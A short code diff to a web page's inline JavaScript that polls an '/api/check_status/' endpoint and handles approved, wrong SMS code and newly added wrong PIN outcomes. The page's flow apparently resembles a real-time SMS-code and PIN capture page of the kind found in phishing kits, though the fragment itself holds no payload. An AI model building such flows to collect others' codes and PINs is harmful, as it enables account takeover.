@@ -100,6 +100,7 @@
       var res = await fetch('/api/check_status/' + appId); var data = await res.json();
       if (data.code_status === 'approved') { clearInterval(checkInterval); document.getElementById('successOverlay').classList.add('active'); }
       else if (data.code_status === 'wrong_code') { clearInterval(checkInterval); document.getElementById('waitSection').style.display = 'none'; document.getElementById('codeSection').style.display = 'block'; document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Wrong code. Try again.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); }
+      else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { clearInterval(checkInterval); alert('Wrong PIN. Please use the correct PIN.'); window.location.href = '/'; }
     }, 2000);
   }
 </script>
